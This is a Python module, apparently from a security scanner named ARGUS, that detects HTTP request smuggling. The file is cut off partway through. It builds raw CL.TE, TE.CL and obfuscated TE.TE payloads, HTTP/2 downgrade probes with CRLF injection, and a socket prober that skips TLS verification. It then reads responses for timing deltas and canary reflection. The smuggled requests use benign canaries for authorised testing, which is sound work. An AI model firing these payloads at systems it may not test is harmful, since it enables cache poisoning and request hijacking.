"""
HTTP Request Smuggling Detection Collector for ARGUS.

Actively validates whether reverse proxies, load balancers, CDN caches, and backend HTTP servers
properly synchronize HTTP request boundaries according to RFC 7230 §3.3.3 and RFC 9113:
1. CL.TE Desynchronization:
   - Front-end parses Content-Length, Back-end parses Transfer-Encoding chunked
2. TE.CL Desynchronization:
   - Front-end parses Transfer-Encoding chunked, Back-end parses Content-Length
3. TE.TE Obfuscation & Desynchronization:
   - Both front-end and back-end support Transfer-Encoding, but header obfuscation
     induces one server to ignore it and fall back to Content-Length
4. HTTP/2 Request Smuggling (H2.CL, H2.TE, Pseudo-Header CRLF Injection):
   - Frontend-to-backend HTTP/2 -> HTTP/1.1 downgrade translation flaws:
     * Contradictory Content-Length in HTTP/2 requests
     * Forbidden Transfer-Encoding chunked headers preserved during downgrade
     * CRLF injection in :path pseudo-headers and custom header values
5. Differential Response Time & Sequential 2-Request Pipeline Confirmation:
   - Statistical baseline latency comparison with differential timeout probing (delta t >= 3.0s)
   - 2-request confirmation sequence: Attack probe with canary path/header prefix followed
     by benign request detecting status inversion (404/405) or canary reflection.
6. False Positive Rejection:
   - Hardened endpoints returning 400 Bad Request, 501 Not Implemented, 505 Version Not Supported,
     or consistent timing without boundary desync MUST NOT generate evidence.

Supports 6+ distinct mutation & obfuscation strategies:
1. HEADER_CASING_WHITESPACE: Transfer-encoding: [tab]chunked, Transfer-Encoding : chunked, Transfer-Encoding:\\r\\n chunked
2. DUAL_HEADER: Transfer-Encoding: x\\r\\nTransfer-Encoding: chunked, duplicate Content-Length
3. HOP_BY_HOP: Connection: Transfer-Encoding\\r\\nTransfer-Encoding: chunked
4. CHUNK_EXTENSION: 0;foo=bar\\r\\n\\r\\n, chunk extensions
5. HEX_MUTATION: 0X0\\r\\n\\r\\n, padded chunk lengths 0000\\r\\n\\r\\n
6. H2_PSEUDO_HEADER: :path: /endpoint HTTP/1.1\\r\\nTransfer-Encoding: chunked, CRLF injection

Emits structured Evidence(category="request_smuggling"), updates mission vulnerabilities,
and expands AttackSurfaceGraph with HAS_ENDPOINT and HAS_VULNERABILITY edges.
"""
from __future__ import annotations

import logging
import re
import socket
import ssl
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


# ============================================================================
# Enums & Dataclasses
# ============================================================================

class RequestSmugglingSeverity(str, Enum):
    """Request smuggling vulnerability severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


# Backwards compatibility alias
Severity = RequestSmugglingSeverity


class RequestSmugglingTechnique(str, Enum):
    """Enumeration of HTTP request smuggling detection techniques."""
    CL_TE = "cl_te"
    TE_CL = "te_cl"
    TE_TE = "te_te"
    H2_CL = "h2_cl"
    H2_TE = "h2_te"
    H2_CRLF = "h2_crlf"
    DIFFERENTIAL_TIMING = "differential_timing"
    PIPELINE_POISONING = "pipeline_poisoning"


class RequestSmugglingMutationStrategy(str, Enum):
    """Enumeration of HTTP header obfuscation and mutation strategies."""
    STANDARD = "standard"
    HEADER_CASING_WHITESPACE = "header_casing_whitespace"
    DUAL_HEADER = "dual_header"
    HOP_BY_HOP = "hop_by_hop"
    CHUNK_EXTENSION = "chunk_extension"
    HEX_MUTATION = "hex_mutation"
    H2_PSEUDO_HEADER = "h2_pseudo_header"
    COMMA_DELIMITED = "comma_delimited"


@dataclass
class RawHttpResponse:
    """Represents a low-level HTTP response captured from a raw byte stream / socket."""
    status_code: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    raw_headers: List[Tuple[str, str]] = field(default_factory=list)
    body: str = ""
    raw_bytes: bytes = b""
    elapsed: float = 0.0
    error: Optional[str] = None
    timed_out: bool = False
    protocol: str = "HTTP/1.1"
    url: str = ""


@dataclass
class RequestSmugglingResult:
    """Represents the outcome of an HTTP request smuggling validation probe."""
    technique: str
    mutation_strategy: str
    severity: str
    confidence: float
    payload: str
    matched_signature: str
    evidence_snippet: str
    endpoint_url: str
    parameter: Optional[str] = None
    parameter_type: str = "http_header"
    status_code: int = 200
    delay_delta: float = 0.0
    baseline_elapsed: float = 0.0
    injected_elapsed: float = 0.0
    is_valid_finding: bool = True
    error_message: Optional[str] = None
    template_id: str = "request-smuggling"
    vulnerability_type: Optional[str] = None
    cwe_id: str = "CWE-444"
    cvss_score: float = 8.9
    follow_up_status: Optional[int] = None

    def __post_init__(self):
        if not self.vulnerability_type:
            self.vulnerability_type = self.technique


# ============================================================================
# Signature Catalogs & Heuristics
# ============================================================================

HARDENED_DEFENSE_SIGNATURES: Dict[str, re.Pattern] = {
    "bad_request": re.compile(
        r"(?:400\s+Bad\s+Request|invalid\s+request\s+line|malformed\s+http\s+header|illegal\s+request|unsupported\s+transfer\s+encoding|duplicate\s+content-length|transfer-encoding\s+not\s+supported|rfc\s+compliance\s+error)",
        re.IGNORECASE,
    ),
    "not_implemented": re.compile(
        r"(?:501\s+Not\s+Implemented|unsupported\s+method|chunked\s+encoding\s+not\s+supported)",
        re.IGNORECASE,
    ),
    "h2_protocol_error": re.compile(
        r"(?:PROTOCOL_ERROR|HTTP_1_1_REQUIRED|FRAME_SIZE_ERROR|REFUSED_STREAM|invalid\s+pseudo\s+header)",
        re.IGNORECASE,
    ),
}

CANARY_DESYNC_SIGNATURES: Dict[str, re.Pattern] = {
    "canary_marker": re.compile(r"ARGUS_SMUGGLE_CANARY", re.IGNORECASE),
    "canary_path": re.compile(r"/argus_smuggled_canary", re.IGNORECASE),
    "unrecognized_method": re.compile(r"(?:GPOST|PGET|SMUGGLE|CANARY|XGET)\b", re.IGNORECASE),
    "status_inversion_404": re.compile(r"(?:404\s+Not\s+Found|cannot\s+find|no\s+such\s+resource)", re.IGNORECASE),
    "status_inversion_405": re.compile(r"(?:405\s+Method\s+Not\s+Allowed)", re.IGNORECASE),
}


# ============================================================================
# Raw HTTP Stream Prober
# ============================================================================

class RawHttpStreamProber:
    """
    Low-level raw HTTP stream prober capable of transmitting byte-precise,
    un-sanitized HTTP streams over TCP/TLS sockets.

    Supports custom transport adapters for mocking and unit/integration testing.
    """

    def __init__(
        self,
        timeout: float = 10.0,
        transport_adapter: Optional[Callable[..., RawHttpResponse]] = None,
        verify_ssl: bool = False,
    ):
        self.timeout = timeout
        self.transport_adapter = transport_adapter
        self.verify_ssl = verify_ssl

    def send_raw_probe(
        self,
        target_url: str,
        raw_payload: Union[str, bytes],
        timeout: Optional[float] = None,
    ) -> RawHttpResponse:
        """
        Transmits raw un-sanitized byte stream to target host and parses the HTTP response.
        """
        if self.transport_adapter is not None:
            return self.transport_adapter(target_url, raw_payload, timeout=timeout or self.timeout)

        req_bytes = raw_payload.encode("latin-1") if isinstance(raw_payload, str) else raw_payload
        effective_timeout = timeout if timeout is not None else self.timeout

        parsed = urllib.parse.urlparse(target_url)
        scheme = parsed.scheme.lower() or "http"
        host = parsed.hostname or "127.0.0.1"
        port = parsed.port or (443 if scheme == "https" else 80)

        start_time = time.time()
        sock = None
        try:
            sock = socket.create_connection((host, port), timeout=effective_timeout)
            if scheme == "https":
                context = ssl.create_default_context()
                if not self.verify_ssl:
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)

            sock.settimeout(effective_timeout)
            sock.sendall(req_bytes)

            # Receive raw response bytes
            response_chunks = []
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response_chunks.append(chunk)
                except socket.timeout:
                    # Trailing timeout is expected when desynchronization induces connection hang
                    break
                except (ConnectionResetError, BrokenPipeError):
                    break

            elapsed = time.time() - start_time
            raw_data = b"".join(response_chunks)

            return self._parse_raw_http_response(raw_data, elapsed, target_url)

        except socket.timeout:
            elapsed = time.time() - start_time
            return RawHttpResponse(
                status_code=0,
                elapsed=elapsed,
                error="socket_timeout",
                timed_out=True,
                url=target_url,
            )
        except Exception as e:
            elapsed = time.time() - start_time
            return RawHttpResponse(
                status_code=0,
                elapsed=elapsed,
                error=str(e),
                url=target_url,
            )
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    def send_pipeline_sequence(
        self,
        target_url: str,
        attack_payload: Union[str, bytes],
        normal_payload: Union[str, bytes],
        timeout: Optional[float] = None,
        inter_request_delay: float = 0.05,
    ) -> Tuple[RawHttpResponse, RawHttpResponse]:
        """
        Transmits a 2-request sequence:
        1. Attack probe (potentially poisoning socket buffer / desyncing pipeline)
        2. Normal benign follow-up probe (observing desynchronized status or canary reflection)
        """
        resp1 = self.send_raw_probe(target_url, attack_payload, timeout=timeout)
        if inter_request_delay > 0:
            time.sleep(inter_request_delay)
        resp2 = self.send_raw_probe(target_url, normal_payload, timeout=timeout)
        return resp1, resp2

    @staticmethod
    def _parse_raw_http_response(raw_data: bytes, elapsed: float, url: str) -> RawHttpResponse:
        """Parses raw HTTP stream bytes into a structured RawHttpResponse."""
        if not raw_data:
            return RawHttpResponse(
                status_code=0,
                elapsed=elapsed,
                url=url,
                error="empty_response",
            )

        header_part = raw_data
        body_str = ""

        if b"\r\n\r\n" in raw_data:
            header_bytes, body_bytes = raw_data.split(b"\r\n\r\n", 1)
            body_str = body_bytes.decode("latin-1", errors="replace")
        elif b"\n\n" in raw_data:
            header_bytes, body_bytes = raw_data.split(b"\n\n", 1)
            body_str = body_bytes.decode("latin-1", errors="replace")
        else:
            header_bytes = raw_data

        lines = header_bytes.decode("latin-1", errors="replace").splitlines()
        status_code = 0
        protocol = "HTTP/1.1"
        headers: Dict[str, str] = {}
        raw_headers: List[Tuple[str, str]] = []

        if lines:
            status_line = lines[0].strip()
            parts = status_line.split(" ", 2)
            if len(parts) >= 2:
                protocol = parts[0]
                try:
                    status_code = int(parts[1])
                except ValueError:
                    status_code = 0

            for line in lines[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    k_str = k.strip()
                    v_str = v.strip()
                    headers[k_str.lower()] = v_str
                    raw_headers.append((k_str, v_str))

        return RawHttpResponse(
            status_code=status_code,
            headers=headers,
            raw_headers=raw_headers,
            body=body_str,
            raw_bytes=raw_data,
            elapsed=elapsed,
            protocol=protocol,
            url=url,
        )


# ============================================================================
# Payload Generator
# ============================================================================

class RequestSmugglingPayloadGenerator:
    """
    Constructs raw HTTP/1.1 and simulated HTTP/2 payloads covering CL.TE, TE.CL,
    TE.TE obfuscations, and pipeline poisoning attacks.
    """

    @staticmethod
    def build_baseline_probe(host: str, path: str = "/") -> str:
        """Constructs a standard, benign HTTP/1.1 GET probe for baseline latency measurement."""
        return (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

    @staticmethod
    def build_cl_te_timing_probe(host: str, path: str = "/") -> str:
        """
        Constructs a CL.TE differential timing probe.
        Frontend uses Content-Length (declaring 4 bytes).
        Backend uses Transfer-Encoding chunked and waits for next chunk, inducing a timeout delay.
        """
        body = "1\r\nZ\r\nQ\r\n"
        # Content-Length is 4 (covers '1\r\nZ\r\n'), backend parses chunk 1 ('Z') and hangs waiting for next chunk length
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q\r\n"
        )

    @staticmethod
    def build_te_cl_timing_probe(host: str, path: str = "/") -> str:
        """
        Constructs a TE.CL differential timing probe.
        Frontend uses Transfer-Encoding chunked (stops at 0\\r\\n\\r\\n).
        Backend uses Content-Length (declaring 6 bytes) and hangs waiting for remaining bytes.
        """
        # Frontend sees valid terminating chunk (0\r\n\r\n) and forwards. Backend expects 6 bytes but gets 5.
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        )

    @staticmethod
    def build_cl_te_pipeline_probe(
        host: str,
        path: str = "/",
        canary_path: str = "/argus_smuggled_canary",
        canary_header: str = "ARGUS_SMUGGLE_CANARY",
    ) -> Tuple[str, str]:
        """
        Constructs a CL.TE 2-request confirmation sequence.
        Attack probe leaves a partial GET request in the backend socket buffer.
        Follow-up benign probe triggers canary path/header reflection.
        """
        smuggled_request = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Canary: {canary_header}\r\n"
            f"X-Ignore: X"
        )
        chunked_body = (
            f"0\r\n"
            f"\r\n"
            f"{smuggled_request}"
        )
        content_length = len(chunked_body)

        attack_probe = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunked_body}"
        )

        follow_up_probe = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: close\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 5\r\n"
            f"\r\n"
            f"x=123"
        )

        return attack_probe, follow_up_probe

    @staticmethod
    def build_te_cl_pipeline_probe(
        host: str,
        path: str = "/",
        canary_path: str = "/argus_smuggled_canary",
        canary_header: str = "ARGUS_SMUGGLE_CANARY",
    ) -> Tuple[str, str]:
        """
        Constructs a TE.CL 2-request confirmation sequence.
        Attack probe specifies chunk containing smuggled GET request.
        """
        smuggled_request = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Canary: {canary_header}\r\n"
            f"Foo: bar"
        )
        hex_len = hex(len(smuggled_request))[2:]
        chunked_body = (
            f"{hex_len}\r\n"
            f"{smuggled_request}\r\n"
            f"0\r\n"
            f"\r\n"
        )

        attack_probe = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunked_body}"
        )

        follow_up_probe = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        return attack_probe, follow_up_probe

    @classmethod
    def generate_te_te_mutations(
        cls,
        host: str,
        path: str = "/",
        canary_path: str = "/argus_smuggled_canary",
    ) -> List[Tuple[RequestSmugglingMutationStrategy, str, str, str]]:
        """
        Generates TE.TE obfuscated headers across multiple mutation strategies.
        Returns list of (strategy, attack_probe, follow_up_probe, description).
        """
        mutations: List[Tuple[RequestSmugglingMutationStrategy, str, str, str]] = []

        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Canary: ARGUS_SMUGGLE_CANARY\r\n"
            f"X-Ignore: X"
        )
        chunked_body = f"0\r\n\r\n{smuggled}"
        cl = len(chunked_body)

        follow_up = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"Content-Length: 5\r\n"
            f"\r\n"
            f"x=123"
        )

        # 1. Header Casing & Whitespace Variations
        casing_variants = [
            ("Transfer-Encoding: chunked\r\nTransfer-encoding: [tab]chunked", "Transfer-Encoding: chunked\r\nTransfer-encoding:\tchunked"),
            ("Transfer-Encoding : chunked", "Transfer-Encoding : chunked"),
            ("Transfer-Encoding:  chunked (multiple spaces)", "Transfer-Encoding:  chunked"),
            ("Transfer-Encoding:\\r\\n chunked (multiline folding)", "Transfer-Encoding:\r\n chunked"),
            ("transfer-encoding: chunked (lowercase)", "transfer-encoding: chunked"),
        ]
        for desc, te_hdr in casing_variants:
            probe = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: keep-alive\r\n"
                f"Content-Length: {cl}\r\n"
                f"{te_hdr}\r\n"
                f"\r\n"
                f"{chunked_body}"
            )
            mutations.append((RequestSmugglingMutationStrategy.HEADER_CASING_WHITESPACE, probe, follow_up, desc))

        # 2. Dual Conflicting Headers
        dual_variants = [
            ("Transfer-Encoding: x and Transfer-Encoding: chunked", "Transfer-Encoding: x\r\nTransfer-Encoding: chunked"),
            ("Transfer-Encoding: chunked and Transfer-Encoding: identity", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
            ("Duplicate Transfer-Encoding headers", "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked"),
        ]
        for desc, te_hdr in dual_variants:
            probe = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: keep-alive\r\n"
                f"Content-Length: {cl}\r\n"
                f"{te_hdr}\r\n"
                f"\r\n"
                f"{chunked_body}"
            )
            mutations.append((RequestSmugglingMutationStrategy.DUAL_HEADER, probe, follow_up, desc))

        # 3. Hop-by-Hop Stripping
        hop_variants = [
            ("Connection: Transfer-Encoding header stripping", "Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked"),
            ("Connection: keep-alive, Transfer-Encoding", "Connection: keep-alive, Transfer-Encoding\r\nTransfer-Encoding: chunked"),
            ("X-Forwarded-For with Connection: Transfer-Encoding", "X-Forwarded-For: 127.0.0.1\r\nConnection: Transfer-Encoding\r\nTransfer-Encoding: chunked"),
        ]
        for desc, te_hdr in hop_variants:
            probe = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {cl}\r\n"
                f"{te_hdr}\r\n"
                f"\r\n"
                f"{chunked_body}"
            )
            mutations.append((RequestSmugglingMutationStrategy.HOP_BY_HOP, probe, follow_up, desc))

        # 4. Chunk Size Extensions
        chunk_ext_body = f"0;foo=bar\r\n\r\n{smuggled}"
        cl_ext = len(chunk_ext_body)
        probe_ext = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl_ext}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunk_ext_body}"
        )
        mutations.append((RequestSmugglingMutationStrategy.CHUNK_EXTENSION, probe_ext, follow_up, "Chunk extension: 0;foo=bar\\r\\n\\r\\n"))

        # 5. Hex Casing & Padded Variations
        hex_body = f"0X0\r\n\r\n{smuggled}"
        cl_hex = len(hex_body)
        probe_hex = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl_hex}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{hex_body}"
        )
        mutations.append((RequestSmugglingMutationStrategy.HEX_MUTATION, probe_hex, follow_up, "Hex uppercase: 0X0\\r\\n\\r\\n"))

        # 6. Comma-Delimited
        probe_comma = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl}\r\n"
            f"Transfer-Encoding: chunked, identity\r\n"
            f"\r\n"
            f"{chunked_body}"
        )
        mutations.append((RequestSmugglingMutationStrategy.COMMA_DELIMITED, probe_comma, follow_up, "Comma delimited: Transfer-Encoding: chunked, identity"))

        return mutations

    @classmethod
    def generate_h2_downgrade_probes(
        cls,
        host: str,
        path: str = "/",
        canary_path: str = "/argus_smuggled_canary",
    ) -> List[Tuple[RequestSmugglingTechnique, RequestSmugglingMutationStrategy, Dict[str, Any], str]]:
        """
        Generates simulated HTTP/2 downgrade smuggling vectors (H2.CL, H2.TE, and pseudo-header CRLF injection).
        Returns list of (technique, strategy, h2_frame_meta, description).
        """
        probes: List[Tuple[RequestSmugglingTechnique, RequestSmugglingMutationStrategy, Dict[str, Any], str]] = []

        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Canary: ARGUS_SMUGGLE_CANARY\r\n"
            f"Foo: bar"
        )

        # 1. H2.CL: HTTP/2 request with explicit Content-Length smaller than DATA frames
        probes.append((
            RequestSmugglingTechnique.H2_CL,
            RequestSmugglingMutationStrategy.STANDARD,
            {
                ":method": "POST",
                ":path": path,
                ":authority": host,
                ":scheme": "https",
                "content-length": "0",
                "body": smuggled,
            },
            "H2.CL: HTTP/2 frame with Content-Length: 0 and trailing DATA stream",
        ))

        # 2. H2.TE: HTTP/2 request containing forbidden Transfer-Encoding header
        probes.append((
            RequestSmugglingTechnique.H2_TE,
            RequestSmugglingMutationStrategy.STANDARD,
            {
                ":method": "POST",
                ":path": path,
                ":authority": host,
                ":scheme": "https",
                "transfer-encoding": "chunked",
                "body": f"0\r\n\r\n{smuggled}",
            },
            "H2.TE: HTTP/2 frame with forbidden Transfer-Encoding: chunked preserved during downgrade",
        ))

        # 3. H2 CRLF Injection in :path pseudo-header
        crlf_path = f"{path} HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n{smuggled}"
        probes.append((
            RequestSmugglingTechnique.H2_CRLF,
            RequestSmugglingMutationStrategy.H2_PSEUDO_HEADER,
            {
                ":method": "POST",
                ":path": crlf_path,
                ":authority": host,
                ":scheme": "https",
                "body": "",
            },
            "H2 CRLF: :path pseudo-header CRLF injection inducing HTTP/1.1 chunked boundary desync",
        ))

        # 4. H2 CRLF Injection in custom header value
        probes.append((
            RequestSmugglingTechnique.H2_CRLF,
            RequestSmugglingMutationStrategy.HEADER_CASING_WHITESPACE,
            {
                ":method": "POST",
                ":path": path,
                ":authority": host,
                ":scheme": "https",
                "x-custom-header": f"value\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n{smuggled}",
                "body": "",
            },
            "H2 CRLF: Custom header value CRLF injection",
        ))

        return probes


# ============================================================================
# Security Analyzer
# ============================================================================

class RequestSmugglingSecurityAnalyzer:
    """
    Analyzes differential latency, sequential 2-request pipeline responses,
    and HTTP/2 downgrade responses to detect request desynchronization vulnerabilities.
    """

    @classmethod
    def is_hardened_rejection(
        cls,
        status_code: int,
        body: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> bool:
        """
        Determines if a target server hardened defense legitimately rejected
        the malformed / ambiguous request (e.g. 400 Bad Request or 501 Not Implemented).
        Hardened endpoints MUST NOT produce false positive findings.
        """
        # Hard rejection status codes
        if status_code in (400, 501, 505):
            return True

        content = (body or "")
        if headers:
            content += " " + " ".join(f"{k}: {v}" for k, v in headers.items())

        for _, pattern in HARDENED_DEFENSE_SIGNATURES.items():
            if pattern.search(content):
                return True

        return False

    @classmethod
    def analyze_timing_response(
        cls,
        endpoint_url: str,
        technique: str,
        strategy: str,
        baseline_elapsed: float,
        injected_elapsed: float,
        threshold: float = 3.0,
        status_code: int = 200,
        payload: str = "",
        error_message: Optional[str] = None,
    ) -> Optional[RequestSmugglingResult]:
        """
        Analyzes differential response latency between a baseline request and a desync probe.
        A latency delta (injected - baseline) >= threshold (or socket timeout on injected while baseline was fast)
        indicates that the backend server hung waiting for missing request boundary bytes.
        """
        delta = injected_elapsed - baseline_elapsed

        # If server cleanly rejected with 400/501 or timed out immediately, it's not a desync
        if cls.is_hardened_rejection(status_code, error_message):
            return None

        # Check for significant differential latency (>= threshold) or socket timeout on injected
        is_timing_vulnerable = False
        if delta >= threshold and baseline_elapsed < 2.0:
            is_timing_vulnerable = True
        elif error_message == "socket_timeout" and baseline_elapsed < 2.0 and injected_elapsed >= threshold:
            is_timing_vulnerable = True

        if not is_timing_vulnerable:
            return None

        tech_upper = technique.upper().replace("_", ".")
        tech_lower = technique.lower()
        cvss = 9.8 if ("cl_te" in tech_lower or "te_cl" in tech_lower or "cl.te" in tech_lower or "te.cl" in tech_lower) else 8.9

        return RequestSmugglingResult(
            technique=technique,
            mutation_strategy=strategy,
            severity=RequestSmugglingSeverity.CRITICAL.value if cvss >= 9.0 else RequestSmugglingSeverity.HIGH.value,
            confidence=0.88,
            payload=payload[:300] if payload else f"{technique} Differential Timing Probe",
            matched_signature="differential_timing_desync_delay",
            evidence_snippet=(
                f"HTTP request desynchronization detected on '{endpoint_url}' using technique '{tech_upper}'. "
                f"Baseline latency: {baseline_elapsed:.2f}s, Injected latency: {injected_elapsed:.2f}s "
                f"(differential delta: {delta:.2f}s >= threshold {threshold:.2f}s)."
            ),
            endpoint_url=endpoint_url,
            parameter="Transfer-Encoding",
            parameter_type="http_header",
            status_code=status_code,
            delay_delta=delta,
            baseline_elapsed=baseline_elapsed,
            injected_elapsed=injected_elapsed,
            template_id="request-smuggling-timing",
            cwe_id="CWE-444",
            cvss_score=cvss,
        )

    @classmethod
    def analyze_pipeline_response(
        cls,
        endpoint_url: str,
        technique: str,
        strategy: str,
        attack_resp: RawHttpResponse,
        follow_up_resp: RawHttpResponse,
        canary_path: str = "/argus_smuggled_canary",
        canary_marker: str = "ARGUS_SMUGGLE_CANARY",
        baseline_status: int = 200,
        payload: str = "",
    ) -> Optional[RequestSmugglingResult]:
        """
        Analyzes the 2-request pipeline confirmation sequence.
        Detects status inversion (e.g. follow-up returned 404 for canary path when baseline was 200)
        or canary header/body reflection in the follow-up response.
        """
        # Hardened rejection on initial attack probe
        if cls.is_hardened_rejection(attack_resp.status_code, attack_resp.body, attack_resp.headers):
            return None

        # Check follow-up response for canary evidence or status inversion
        follow_up_body = follow_up_resp.body or ""
        follow_up_headers = " ".join(f"{k}: {v}" for k, v in follow_up_resp.headers.items())
        combined_follow_up = f"{follow_up_headers} {follow_up_body}"

        has_canary_reflection = (
            canary_marker.lower() in combined_follow_up.lower()
            or canary_path.lower() in combined_follow_up.lower()
        )

        has_status_inversion = False
        # If baseline was normal (200/302) and follow-up was 404 (routed to canary path) or 405 (method changed)
        if baseline_status in (200, 201, 301, 302, 307, 308):
            if follow_up_resp.status_code in (404, 405):
                has_status_inversion = True

        if not (has_canary_reflection or has_status_inversion):
            return None

        tech_upper = technique.upper().replace("_", ".")
        sig_matched = "canary_reflection" if has_canary_reflection else "pipeline_status_inversion"

        return RequestSmugglingResult(
            technique=technique,
            mutation_strategy=strategy,
            severity=RequestSmugglingSeverity.CRITICAL.value,
            confidence=0.98 if has_canary_reflection else 0.92,
            payload=payload[:300] if payload else f"{technique} Pipeline Poisoning Probe",
            matched_signature=sig_matched,
            evidence_snippet=(
                f"HTTP request smuggling pipeline desynchronization confirmed on '{endpoint_url}' ({tech_upper}). "
                f"Follow-up request received status {follow_up_resp.status_code} with "
                f"{'canary reflection in response' if has_canary_reflection else 'status inversion (404/405 canary routing)'}."
            ),
            endpoint_url=endpoint_url,
            parameter="Transfer-Encoding",
            parameter_type="http_header",
            status_code=follow_up_resp.status_code,
            template_id="request-smuggling-pipeline",
            cwe_id="CWE-444",
            cvss_score=9.8,
            follow_up_status=follow_up_resp.status_code,
        )

    @classmethod
    def analyze_h2_downgrade_response(
        cls,
        endpoint_url: str,
        technique: str,
        strategy: str,
        response: RawHttpResponse,
        canary_marker: str = "ARGUS_SMUGGLE_CANARY",
        payload: str = "",
    ) -> Optional[RequestSmugglingResult]:
        """
        Analyzes responses to simulated HTTP/2 downgrade probes.
        """
        if cls.is_hardened_rejection(response.status_code, response.body, response.headers):
            return None

        content = f"{response.body} " + " ".join(f"{k}: {v}" for k, v in response.headers.items())
        if canary_marker.lower() in content.lower() or response.status_code in (404, 405, 502):
            return RequestSmugglingResult(
                technique=technique,
                mutation_strategy=strategy,
                severity=RequestSmugglingSeverity.CRITICAL.value,
                confidence=0.95,
                payload=payload[:300] if payload else f"HTTP/2 Downgrade Probe ({technique})",
                matched_signature="h2_downgrade_desync",
                evidence_snippet=f"HTTP/2 to HTTP/1.1 downgrade request smuggling confirmed on '{endpoint_url}' via technique '{technique}'.",
                endpoint_url=endpoint_url,
                parameter=":path / Transfer-Encoding",
                parameter_type="http2_pseudo_header",
                status_code=response.status_code,
                template_id="http2-request-smuggling",
                cwe_id="CWE-444",
                cvss_score=9.8,
            )

        return None

    @classmethod
    def analyze_desync_response(
        cls,
        endpoint_url: str,
        technique: str,
        strategy: str,
        payload_str: str,
        response: RawHttpResponse,
        baseline_resp: Optional[RawHttpResponse] = None,
    ) -> Optional[RequestSmugglingResult]:
        """
        Direct analysis of a single desync probe response against baseline.
        """
        if cls.is_hardened_rejection(response.status_code, response.body, response.headers):
            return None

        # Check for canary reflection
        for sig_name, pattern in CANARY_DESYNC_SIGNATURES.items():
            if pattern.search(response.body) or (response.headers and any(pattern.search(f"{k}: {v}") for k, v in response.headers.items())):
                return RequestSmugglingResult(
                    technique=technique,
                    mutation_strategy=strategy,
                    severity=RequestSmugglingSeverity.CRITICAL.value,
                    confidence=0.95,
                    payload=payload_str[:300],
                    matched_signature=sig_name,
                    evidence_snippet=f"HTTP request smuggling signature '{sig_name}' detected on '{endpoint_url}'.",
